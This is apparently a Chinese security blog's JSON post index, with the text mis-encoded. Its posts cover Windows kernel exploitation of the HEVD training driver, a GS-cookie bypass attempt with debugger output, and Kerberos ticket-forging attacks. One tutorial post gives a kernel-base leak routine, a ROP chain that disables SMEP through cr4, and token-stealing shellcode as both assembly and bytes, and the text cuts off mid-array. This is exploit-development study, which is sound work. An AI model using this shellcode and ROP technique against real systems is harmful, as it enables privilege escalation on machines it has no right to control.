{"meta":{"title":"Joe1sn's Cabinet","subtitle":"","description":"","author":"Joe1sn","url":"https://joe1sn.eu.org","root":"/"},"pages":[],"posts":[{"title":"ã€Win Pwnã€‘è®°ä¸€æ¬¡å¤±è´¥çš„Windowså†…æ ¸GSæ ˆæº¢å‡ºä¿æŠ¤","slug":"win-hevd-exp-stackoverflow-GS","date":"2024-02-16T03:10:43.000Z","updated":"2024-02-16T03:15:17.357Z","comments":true,"path":"2024/02/16/win-hevd-exp-stackoverflow-GS/","link":"","permalink":"https://joe1sn.eu.org/2024/02/16/win-hevd-exp-stackoverflow-GS/","excerpt":"HEVDä¸­çš„æ ˆæº¢å‡ºåŠ ä¸ŠGSä¿æŠ¤ï¼Œè²Œä¼¼æ²¡æœ‰ä»€ä¹ˆå¥½çš„æ–¹æ³•äº†","text":"HEVDä¸­çš„æ ˆæº¢å‡ºåŠ ä¸ŠGSä¿æŠ¤ï¼Œè²Œä¼¼æ²¡æœ‰ä»€ä¹ˆå¥½çš„æ–¹æ³•äº† å‡½æ•°åŠŸèƒ½ åœ¨ä¸Šä¸‰ç¯‡ä¸­è®²çš„å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œæˆ‘å…³é—­äº†KVAS åˆæ˜¯ä¸€æ®µç»å…¸çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯æœ‰äº†å†…æ ¸çš„GSä¿æŠ¤ è¿™é‡Œå°±ä¸å¾—ä¸æåˆ°Windowsä¸­ä¸€ç§Cannaryçš„ç»•è¿‡æ–¹å¼äº†ï¼Œé€šè¿‡try exceptçš„Handlerè¿›è¡Œç»•è¿‡ï¼Œå¾ˆé—æ†¾handleråªåœ¨32ä½ç¨‹åºä¸­æ‰ä¿å­˜åœ¨æ ˆä¸Š æŸ¥é˜…èµ„æ–™ https://paper.seebug.org/2017/#22 https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html cookieå€¼æ˜¯å­˜å‚¨åœ¨_dataæ®µçš„ç¬¬ä¸€ä¸ª å‡½æ•°æ£€æŸ¥çš„éƒ¨åˆ†ï¼Œæœ‰ä¸€ä¸ªå¼‚æˆ– 123456789101112131415161718192021222324252627281: kd&gt; dqs rspffff8788`21979540 00000000`00000000ffff8788`21979548 ffffc186`261f98f0ffff8788`21979550 ffffc186`269c86b0ffff8788`21979558 00000000`80000004ffff8788`21979560 00000000`00000000ffff8788`21979568 fffff804`2a4d66e5 HEVD!TriggerBufferOverflowStackGS+0x5 [c:\\projects\\hevd\\driver\\hevd\\bufferoverflowstackgs.c @ 70]ffff8788`21979570 00000000`00000000ffff8788`21979578 00000000`00000003ffff8788`21979580 54535f57`4f4c4652ffff8788`21979588 ffffc186`1f93206cffff8788`21979590 00000000`00000000ffff8788`21979598 00000000`00000000ffff8788`219795a0 00000000`00000000ffff8788`219795a8 00000000`00000000ffff8788`219795b0 ffff8788`219796a0ffff8788`219795b8 00000000`000000001: kd&gt; r raxrax=0000ad10688998111: kd&gt; s rsp L1000 07 20 22ffff8788`219797e8 07 20 22 00 00 00 00 00-20 0d 07 27 86 c1 ff ff . &quot;..... ..&#x27;....ffff8788`21979988 07 20 22 00 86 c1 ff ff-00 00 00 00 00 00 00 00 . &quot;.............ffff8788`21979a48 07 20 22 00 ff ff ff ff-30 e8 d9 1f 07 00 00 00 . &quot;.....0.......ffff8788`21979ab8 07 20 22 00 00 00 00 00-30 e8 d9 1f 07 00 00 00 . &quot;.....0.......1: kd&gt; ? ffff8788`219797e8-rspEvaluate expression: 680 = 00000000`000002a8 åˆ©ç”¨ä¹‹å‰çš„ulGetBaseå¾—åˆ°HEVD.sysçš„åŸºåœ°å€ 1230: kd&gt; dqs 0xfffff80522fe0000+3000fffff805`22fe3000 00006fd9`604347b3fffff805`22fe3008 ffff9026`9fbcb84c å†ä¸‹æ–­ç‚¹çœ‹çœ‹æ˜¯ä¸æ˜¯ä¸ºè¿™ä¸ªå€¼ 1234560: kd&gt; gBreakpoint 0 hitHEVD!TriggerBufferOverflowStackGS+0x1b:fffff805`230666fb 4833c4 xor rax,rsp1: kd&gt; r raxrax=00006fd9604347b3 è¿˜çœŸæ˜¯ï¼Œé‚£ä¹ˆè®¿é—®base+3000å°±å¯ä»¥å¾—cookieå€¼ å¦‚ä½•è¯»å–ï¼Ÿè¿™ä¸ªè¿˜çœŸæ²¡åŠæ³•ï¼Œåªèƒ½åˆ©ç”¨å¦å¤–ä¸€ä¸ªæ¼æ´HEVD_IOCTL_ARBITRARY_WRITEï¼Œå°†è¯¥å€¼ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„å€¼ï¼Œä¹Ÿå¯ä»¥è®¾ç½®Ring3ToKernelä¸­çš„ä¸€ä¸ªåœ°å€çš„å€¼ä¸ºå¾…å†™å…¥çš„åœ°æ–¹ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªæ¼æ´å°†cookieå†™å…¥ keyå€¼ä½äºrspä¸Šï¼Œåˆ©ç”¨NtQuerySystemInformationä¸­çš„PSYSTEM_EXTENDED_PROCESS_INFORMATIONå¯ä»¥å¾—åˆ°ï¼Œ ä½†æ˜¯win10å¥½åƒä¿®å¤äº†è¿™ä¸ªåˆ©ç”¨æ–¹å¼ï¼Œå¯¹è¯¥å‡½æ•°å¢åŠ é‰´æƒï¼Œæ™®é€šç”¨æˆ·åªèƒ½ä¾¿åˆ©æ™®é€šç”¨æˆ·çš„æ ˆä¿¡æ¯","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"ã€å…æ€ã€‘æ¢ç´¢Windowså†…ç½‘çš„Kerberosåè®®","slug":"kerberos","date":"2024-02-15T04:29:23.000Z","updated":"2024-02-15T05:48:06.552Z","comments":true,"path":"2024/02/15/kerberos/","link":"","permalink":"https://joe1sn.eu.org/2024/02/15/kerberos/","excerpt":"æ„Ÿæ©å­¦æ ¡æ‰å®çš„å¯†ç å­¦åŠŸåº•ï¼Œåˆ†æèµ·æ¥ä¹Ÿæ˜¯å¾ˆç®€å•çš„","text":"æ„Ÿæ©å­¦æ ¡æ‰å®çš„å¯†ç å­¦åŠŸåº•ï¼Œåˆ†æèµ·æ¥ä¹Ÿæ˜¯å¾ˆç®€å•çš„ è¯´ç™½äº†å°±ä¸€å¼ å›¾ æ”»å‡»æ–¹å¼ é»„é‡‘ç¥¨æ® ç¬¬ä¸‰æ­¥ä¸­ ä½¿ç”¨ KDC ç‰¹å®šè´¦æˆ· Krbtgt çš„ NTLM-Hash æ—¶ï¼Œå¦‚æœæˆ‘ä»¬æœ‰äº†è¯¥NTML-Hashé‚£ä¹ˆå°±èƒ½åšåˆ°ä¼ªé€ TGT è¯¥æ–¹æ³•ç”±äºéœ€è¦DCçš„NTLM-Hashï¼Œæ‰€ä»¥ç”¨äºç•™åé—¨ ç™½é“¶ç¥¨æ® éœ€è¦çŸ¥é“Serverçš„HTLM-Hash ä½¿ç”¨è¯¥å€¼ä¼ªé€ TGTï¼Œåœ¨ç¬¬ä¸ƒæ­¥ä¸­å‘é€ç»™Server ä½†æ˜¯åœ¨æœ‰äº›æœåŠ¡ä¸­å¹¶æ²¡æœ‰éªŒè¯ PAC è¿™ä¸€æ­¥ï¼Œè¿™ä¹Ÿæ˜¯ç™½é“¶ç¥¨æ®èƒ½æˆåŠŸçš„å‰æï¼Œå› ä¸ºå°±ç®—æ‹¥æœ‰ç”¨æˆ·çš„ Hashï¼Œå¯ä»¥ä¼ªé€  TGSï¼Œä½†æ˜¯ä¹Ÿä¸èƒ½åˆ¶ä½œ PACï¼ŒPAC å½“ç„¶ä¹ŸéªŒè¯ä¸æˆåŠŸï¼Œä½†æ˜¯æœ‰äº›æœåŠ¡ä¸å»éªŒè¯ PACï¼Œè¿™æ˜¯ç™½é“¶ç¥¨æ®æˆåŠŸçš„å‰æã€‚ MS14-06 é—®é¢˜å‡ºåœ¨ç¬¬å››æ­¥ KDCä¼šæ ¹æ®å®¢æˆ·ç«¯æŒ‡å®šPACä¸­æ•°å­—ç­¾åçš„åŠ å¯†ç®—æ³•ï¼Œä»¥åŠPACçš„åŠ å¯†ç®—æ³•ï¼Œæ¥æ ¡éªŒPACçš„åˆæ³•æ€§ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯é€šè¿‡ä¼ªé€ PACï¼Œä¿®æ”¹PACä¸­çš„SIDï¼Œå¯¼è‡´KDCåˆ¤æ–­æ”»å‡»è€…ä¸ºé«˜æƒé™ç”¨æˆ·ï¼Œä»è€Œå¯¼è‡´æƒé™æå‡æ¼æ´çš„äº§ç”Ÿ","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"ã€Win Pwnã€‘ä»é›¶æ¢ç´¢ç°ä»£windowså†…æ ¸æ ˆæº¢å‡º-ä»¥HEVDç»ƒä¹ ä¸ºä¾‹ï¼ˆä¸‹ï¼‰","slug":"win-hevd-exp-stackoverflow-III","date":"2024-01-25T07:07:41.000Z","updated":"2024-01-30T10:35:25.969Z","comments":true,"path":"2024/01/25/win-hevd-exp-stackoverflow-III/","link":"","permalink":"https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/","excerpt":"ä¸Šï¼šhttps://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/ ä¸­ï¼šhttps://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/ æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼šhttps://xz.aliyun.com/t/13365 æœ¬é™„å½•å¯¹ç¬¬äºŒç« çš„ä»¥ä¸‹å‡ ä¸ªé—ç•™é—®é¢˜åšå‡ºè¯´æ˜ userç¼–ç¨‹å¯»æ‰¾ROPGadget shellcodeç¼–å†™ Tokenææƒ KVAS","text":"ä¸Šï¼šhttps://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/ ä¸­ï¼šhttps://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/ æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼šhttps://xz.aliyun.com/t/13365 æœ¬é™„å½•å¯¹ç¬¬äºŒç« çš„ä»¥ä¸‹å‡ ä¸ªé—ç•™é—®é¢˜åšå‡ºè¯´æ˜ userç¼–ç¨‹å¯»æ‰¾ROPGadget shellcodeç¼–å†™ Tokenææƒ KVAS userç¼–ç¨‹å¯»æ‰¾ROPGadget ROPå…¨ç§°åŠ è¿”å›å¯¼å‘æ€§ç¼–ç¨‹ï¼Œæ¯”å¦‚è¿™ä¸€ç« ç”¨åˆ°çš„Gadget 12345pop rcxretmov cr4, rcxret å…³äºretæ±‡ç¼–æœ¬è´¨ä¸Šå°±æ˜¯ä»æ ˆå¸§ä¸­å–å‡ºå€¼ï¼Œç„¶åå°†ipå¯„å­˜å™¨è®¾ç½®ä¸ºè¯¥å€¼ï¼Œç­‰ä»·äºpop ipï¼Œè¿™æ ·å°±èƒ½å®Œæˆå‡½æ•°è°ƒç”¨çš„è¿”å›ç­‰ç­‰ã€‚ æœ¬ç« ä¸­å½“æˆ‘ä»¬å‘ç”Ÿæ ˆæº¢å‡ºæ—¶ï¼Œå°±ä¼šæŠŠretçš„ä½ç½®è®¾ç½®ä¸ºç¬¬ä¸€æ®µgadgetçš„ä½ç½® pop rcxå°±ä¼šå°†æ­¤æ—¶æ ˆé¡¶çš„å€¼0x00000000002506f8å­˜å…¥rcxå¯„å­˜å™¨ï¼Œç„¶åretåˆä»æ ˆé¡¶å–å‡ºåœ°å€mov_rc4_rcx_retï¼Œç„¶åripå¯„å­˜å™¨å°±è·³è½¬æ‰§è¡Œäº† mov rc4, rcxå°†rcxå€¼å­˜å…¥rc4ä¸­ç„¶åretåˆå°†æ ˆé¡¶çš„å€¼shellcode_addrè®¾ç½®ä¸ºripå¯„å­˜å™¨çš„å€¼åè¿”å› ç»†å¿ƒä¸€ç‚¹å°±ä¼šå‘ç°æœ¬ç« æˆªå›¾ä¸­çš„åœ°å€ä¸ä¸€æ ·ï¼Œå› ä¸ºå†…æ ¸åŠ è½½æ—¶çš„å†…å­˜è™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯éšæœºåŒ–çš„ï¼Œä¸è¿‡å¯»å€æ–¹å¼ä¾æ—§æ˜¯åŸºåœ°å€+åç§» è¿™å°±å¼•ç”³å‡ºå‡½æ•°ç¬¬ä¸€æ®µä»£ç ï¼šæ‰¾åˆ°å†…æ ¸çš„åŸºåœ°å€ A.æ‰¾åˆ°å†…æ ¸åŸºåœ°å€ é€šè¿‡NtQuerySystemInformation è¿™ä¸ªâ€œåŠéšè—â€å‡½æ•°å®ç°çš„ MSDNï¼šhttps://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation 123456__kernel_entry NTSTATUS NtQuerySystemInformation( [in] SYSTEM_INFORMATION_CLASS SystemInformationClass, [in, out] PVOID SystemInformation, [in] ULONG SystemInformationLength, [out, optional] PULONG ReturnLength); 1[in, out] SystemInformation æŒ‡å‘æ¥æ”¶è¯·æ±‚ä¿¡æ¯çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚ æ­¤ä¿¡æ¯çš„å¤§å°å’Œç»“æ„å›  SystemInformationClass å‚æ•°çš„å€¼è€Œå¼‚ï¼š å¾ˆå¯æƒœï¼Œå…³äºSystemInformationClasså¾®è½¯å¹¶æ²¡æœ‰å…¬å¼€å®ƒçš„è®¾è®¡ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå…³äºæ­¤çš„èµ„æ–™ SYSTEM_INFORMATION_CLASSï¼šhttps://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm ä»–æ˜¯ä¸€ä¸ªæšä¸¾ï¼Œå…¶ä¸­0xBå°±ä»£è¡¨ç€è¦æŸ¥è¯¢çš„æ˜¯SystemModuleInformation SYSTEM_MODULEï¼šhttp://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html 123456789101112typedef struct _SYSTEM_MODULE &#123; ULONG Reserved1; ULONG Reserved2; PVOID ImageBaseAddress; ULONG ImageSize; ULONG Flags; WORD Id; WORD Rank; WORD w018; WORD NameOffset; BYTE Name[MAXIMUM_FILENAME_LENGTH];&#125; SYSTEM_MODULE, *PSYSTEM_MODULE; SystemInformationå°±æ˜¯ç”±SYSTEM_MODULEæ•°ç»„ä½œä¸ºæˆå‘˜çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªæ²¡æœ‰å®˜æ–¹æ–‡æ¡£ï¼Œä¹Ÿæ˜¯é€šè¿‡é€†å‘å¾—åˆ°çš„ 1234typedef struct SYSTEM_MODULE_INFORMATION &#123; ULONG ModulesCount; SYSTEM_MODULE Modules[1];&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION; å…³äºæŸ¥è¯¢å‡½æ•°çš„å®šä¹‰ï¼š 1unsigned long long ulGetKernelBase(PCHAR ModuleName); é¦–å…ˆä»ntdllå¯¼å…¥å‡½æ•° ç„¶ååˆå§‹åŒ–å˜é‡ æŸ¥è¯¢åæ‰“å°å¹¶è¿”å›ï¼Œå¦‚æœæ²¡æœ‰æŸ¥åˆ°å°±è¿”å›0 123456789101112131415161718192021222324252627282930313233343536373839404142434445unsigned long long ulGetKernelBase(PCHAR ModuleName) &#123; PVOID kernelImageBase = NULL; PCHAR kernelImage = NULL; //import function `NtQuerySystemInformation` HMODULE ntdll = GetModuleHandle(TEXT(&quot;ntdll&quot;)); PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, &quot;NtQuerySystemInformation&quot;); if (NtQuerySystemInformation == NULL) &#123; printf(&quot;[!] GetProcAddress() failed.\\n&quot;); return 0; &#125; //init length ULONG len = 0; NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &amp;len); //init module infomations PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); if (pModuleInfo == NULL) &#123; printf(&quot;[!] [ulGetKernelBase] Could not allocate memory for module info.\\n&quot;); return 0; &#125; //starting quering NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &amp;len); if (status != (NTSTATUS)0x0) &#123; printf(&quot;[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\\n&quot;, status); return 0; &#125; for (unsigned int i = 0; i &lt; pModuleInfo-&gt;ModulesCount; i++) &#123; kernelImage = (PCHAR)pModuleInfo-&gt;Modules[i].Name; if (strstr(kernelImage, ModuleName)) &#123; kernelImageBase = pModuleInfo-&gt;Modules[i].ImageBaseAddress; printf(&quot;[*] [ulGetKernelBase] Mod name %s &quot;, kernelImage);#ifdef _WIN64 printf(&quot; Base Addr 0x%llx\\r\\n&quot;, kernelImageBase);#else printf(&quot; Base Addr 0x%X\\r\\n&quot;, kernelImageBase);#endif return (unsigned long long)kernelImageBase; &#125; &#125; return 0;&#125; B. æ‰¾åˆ°å¯¹åº”æ±‡ç¼– å¯ä»¥ä½¿ç”¨CTFå¸¸ç”¨å·¥å…·ROPGadgetï¼Œä»–æ”¯æŒPEæ ¼å¼ï¼ˆå› ä¸ºç”¨çš„Capstoneåæ±‡ç¼–å¼•æ“ï¼‰ 1ROPgadget --binary ./HEVD.sys --only &quot;pop|ret&quot; è¯•è¯•ntoskrl.exeçš„ 10x000000014039eb47 : mov cr4, rcx ; ret å¾—åˆ°åŸºåœ°å€æ˜¯0x39eb47ï¼Œå¦å¤–ä¸€ä¸ªgadgetåŒç† é‡å†™ä¿®æ”¹ä¸‹EXP 12345678910unsigned long long base = ulGetKernelBase((PCHAR)&quot;ntoskrnl.exe&quot;);unsigned long long pop_rcx = base+ 0x20C64C;unsigned long long mov_cr4_rcx = base+ 0x39eb47;printf(&quot;[*] Start set ROP\\n&quot;);*(unsigned long long*)(stackspace + 0x818) = (unsigned long long)pop_rcx;//set RCX = currentRC4*(unsigned long long*)(stackspace + 0x820) = (unsigned long long)0x00000000002506f8;*(unsigned long long*)(stackspace + 0x828) = (unsigned long long)mov_cr4_rcx;*(unsigned long long*)(stackspace + 0x830) = (unsigned long long)shellcode_addr; ä¸€äº›å¸¸è§çš„gadgetå­—èŠ‚åºåˆ— 1234567891011&#123; &quot;RET&quot; , &#123; 0xC3 &#125;&#125;,&#123; &quot;POP_RAX&quot;, &#123; 0x58, 0xC3 &#125;&#125;,&#123; &quot;POP_RCX&quot;, &#123; 0x59, 0xc3 &#125;&#125;,&#123; &quot;MOV_CR4_RCX&quot;, &#123; 0x0f, 0x22, 0xe1, 0xc3 &#125;&#125;,&#123; &quot;NOP&quot;, &#123; 0x4d, 0xc3 &#125;&#125;,&#123; &quot;POP_RAX_POP_RCX&quot;, &#123; 0x58, 0x59, 0xc3 &#125;&#125;,&#123; &quot;MOV_RCX_PTRRAX&quot;, &#123; 0x48, 0x89, 0x08, 0xc3 &#125;&#125;,&#123; &quot;MOV_RAX_PTRRCX&quot;, &#123; 0x89, 0x01, 0xc3 &#125;&#125;,&#123; &quot;XOR_RAX_RAX&quot;, &#123; 0x48, 0x33, 0xc0, 0xc3 &#125;&#125;,&#123; &quot;XOR_ESI_ESI&quot;, &#123; 0x31, 0xf6, 0xc3 &#125;&#125;, å¦‚æœæƒ³ç›´æ¥ä»äºŒè¿›åˆ¶è¯»å–ï¼ˆè¿™æ ·æ›´å¿«ï¼‰å¯ä»¥ä½¿ç”¨ï¼šhttps://github.com/xct/windows-kernel-exploits æä¾›çš„æ€è·¯å»æ‰¾ shellcodeç¼–å†™ A. æ‰‹åŠ¨è¿›è¡ŒTokenææƒ ç¬¬äºŒç« ä¸­ä½¿ç”¨çš„æ˜¯ä»–äººæä¾›çš„shellcodeï¼Œè¿™é‡Œå°è¯•è‡ªå·±å†™æ±‡ç¼– æ³¨æ„ï¼Œè¿™é‡Œæˆ‘ä»¬å·²ç»è¿›å…¥å†…æ ¸äº†ï¼Œæ‰€ä»¥åšçš„äº‹æƒ…å’Œuserçº§åˆ«ä¸ä¸€æ · åŒKRPOCESSä¸åŒçš„æ˜¯EPROCESSæè¿°äº†ç¨‹åºè¿è¡Œçš„ç›¸å…³ç¯å¢ƒï¼Œä¾‹å¦‚ï¼šå¯¹åº”çš„KPROCESSæŒ‡é’ˆã€ç¨‹åºçš„æƒé™ç­‰ åœ¨windbgä¸­ä½¿ç”¨ ï¼Œå¯ä»¥åˆ—ä¸¾æ‰€æœ‰çš„è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ 1!process 0 0 &lt;process_name&gt; ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹å¯¹åº”çš„EPROCESSç»“æ„ä½“ï¼Œè¿™é‡ŒæŸ¥çœ‹Systemè¿›ç¨‹çš„ 1dt nt!_EPROCESS &lt;Process address&gt; Tokenæ˜¯ä¸€ä¸ª_EX_FAST_REFç±»å‹çš„Unionå€¼ RefCntè®°å½•äº†Tokenå¼•ç”¨çš„æ•°ç›®ï¼Œæ˜¯æ•°æ®çš„ä½4ä½(64ä½ä¸­ï¼Œ32ä½æ˜¯3ä½) å°†å½“å‰è¿›ç¨‹çš„é™¤RefCntä»¥å¤–çš„å…¶ä»–bitä½è®¾ç½®ä¸ºå’ŒSystemçš„ä¸€è‡´å°±è¡Œäº†ï¼Œ è¿™é‡Œ Valueä¸æ©ç -0xdï¼ˆRefCountï¼‰è¿›è¡Œ&amp;è¿ç®—å°±èƒ½å¾—åˆ°çœŸå®çš„Tokenå€¼ ç°åœ¨å°†è®¡ç®—å‡ºçš„Tokenå€¼å¤åˆ¶ç»™cmd.exeï¼ˆè¿™æ˜¯ä¸€ä¸ªæ–°çš„Tokenï¼‰ B. è¿›è¡ŒShellcodeç¼–å†™ åœ¨åˆšæ‰çš„EPROCESSä¸­ï¼Œæœ‰ä¸€æ®µè®°å½•çš„æ˜¯ç¨‹åºçš„é“¾è¡¨ï¼šActiveProcessLinksï¼Œè€Œä¸”windowsä¼šç”Ÿæˆä¸€æ®µç‹¬ç‰¹çš„æ ‡è¯†æ¥æ ‡è®°æ¯ä¸€ä¸ªç¨‹åºï¼šUniqueProcessIdï¼Œåœ¨è¿™æ®µ åŒå‘ é“¾è¡¨ä¸Šæ¯æ®µç¨‹åºéƒ½å¯ä»¥è¢«æ‰¾åˆ°ï¼Œå› ä¸ºå¯ä»¥å‘å‰å’Œå‘åæŸ¥æ‰¾ï¼Œä¸€èˆ¬Systemä½äºé“¾è¡¨å¼€å¤´ï¼Œæ‰€ä»¥æ²¿ç€FlinkæŸ¥æ‰¾ é€šè¿‡EPROCESSè·å¾—è‡ªèº«ActiveProcessLinksï¼ŒåŒæ—¶å‘å‰/å‘åæŸ¥æ‰¾ è¿™ç¯‡æ–‡ç« ä¸­é€šè¿‡æ¨¡ä»¿PsGetCurrentProcessï¼Œgs:[188h]æŒ‡å‘çš„æ˜¯ä¸€ä¸ª_KTHREAD ï¼Œå‡½æ•°çš„æ±‡ç¼–ä¼šå°†è¿™ä¸ªåœ°å€add addr,0xb8ï¼Œå°±å¾—åˆ°äº†å½“å‰è¿›ç¨‹çš„_EPROCESSï¼Œè¿™ä¹Ÿæ˜¯è®¸å¤šshellcodeçš„æŠ€å·§ ffff9984d3d97080 å°±ä¸ºä¸€ä¸ª å½“å‰è¿›ç¨‹çš„KiInitialThread +0xB8æŒ‡å‘çš„æ˜¯å½“å‰è¿›ç¨‹çš„EPROCESSäº† æ¯”è¾ƒå½“å‰ActiveProcessLinkså€¼-8çš„å†…å­˜åœ°å€æ˜¯å¦ä¸ºUniqueProcessId å¦ï¼šæ›´æ¢å½“å‰ç»“æ„ä½“ä¸ºä¸‹ä¸€ä¸ª æ˜¯ï¼šä»ActiveProcessLinks-0x70çš„ä½ç½®å¾—åˆ°Tokenåœ°å€ è§£æTokenï¼Œèµ‹å€¼ç»™å½“å‰è¿›ç¨‹ï¼ˆWindowsä¼šè‡ªåŠ¨è§£æä¸ºexpçš„ç¨‹åºï¼ˆä»é¡µè¡¨æ˜ å°„ç­‰æ¥çœ‹ç¡®å®åº”è¯¥å¦‚æ­¤ï¼‰ï¼‰ ä»”ç»†é€†å‘ä¼šå‘ç° é‚£ä¹ˆåœ¨æ²¡æœ‰ä»»ä½•æ ˆå˜åŠ¨çš„æƒ…å†µä¸‹add rsp, 0x28å°±èƒ½æ¢å¤æ ˆï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰äº†ROPï¼ŒROPé“¾ä¸­å­˜åœ¨ä¸¤ä¸ªretå’Œä¸€ä¸ªpopï¼ŒæŠ¬æ ˆäº†0x18ï¼Œæ‰€ä»¥åœ¨shellcodeä¸­åªéœ€è¦add rsp, 0x10 åŒæ—¶HEVDçš„NT_STATUSä½¿ç”¨RAXæ£€æµ‹å¤„ç†æ˜¯å¦æˆåŠŸï¼Œæ‰€ä»¥è¦xor rax,rax 12345678910111213141516171819202122232425262728[Bits 64]_start: xor rax, rax mov rax, gs:[rax+0x188] mov rax, [rax+0xb8] ;rax = å½“å‰EPROCESS mov r9, rax ;r9 = å½“å‰EPROCESS mov rax, [rax+0x448] ;rax = å½“å‰EPROCESS.List mov rax, [rax] ;rax = å½“å‰EPROCESS.List-&gt;flink__loop: mov rdx, [rax-0x8] ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid mov r8, rax ;r8 = å½“å‰EPROCESS.List-&gt;flink mov rax, [rax] ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List cmp rdx, 0x4 jnz __loop ;rdx = 4 ;r8 = System EPROCESS mov rdx, [r8+0x70] ;rdx = system token and rdx, -0x8 ;æ¶ˆé™¤ä½4ä½ mov rcx, [r9+0x4b8] ;å½“å‰EPROCESSçš„token and rcx, 0x7 ; add rdx, rcx ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½ mov [r9+0x4b8], rdx ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰ add rsp, 0x10 retn ä½¿ç”¨nasm 1&amp; &quot;C:\\Users\\xxxx\\AppData\\Local\\bin\\NASM\\nasm.exe&quot; -f win64 .\\TokenSteal.asm -o .\\TokenSteal.bin ç¼–è¯‘å‡ºçš„æ–‡ä»¶ä½COFFæ ¼å¼ï¼Œè¦æå–å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯CFF Exploreçš„å¿«é€Ÿåæ±‡ç¼–å®šä½åˆ°ä»£ç ç„¶åç”¨HxDæå–çš„ 123456789unsigned char cmd[84] = &#123; 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC1, 0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x50, 0xF8, 0x49, 0x89, 0xC0, 0x48, 0x8B, 0x00, 0x48, 0x83, 0xFA, 0x04, 0x75, 0xF0, 0x49, 0x8B, 0x50, 0x70, 0x48, 0x83, 0xE2, 0xF8, 0x49, 0x8B, 0x89, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xE1, 0x07, 0x48, 0x01, 0xCA, 0x49, 0x89, 0x91, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x10, 0xC3&#125;; C. åˆ†æä¸Šä¸€ç¯‡çš„shellcode 12345678910111213141516171819202122232425262728BYTE cmd[256] = &#123; 0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50, 0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 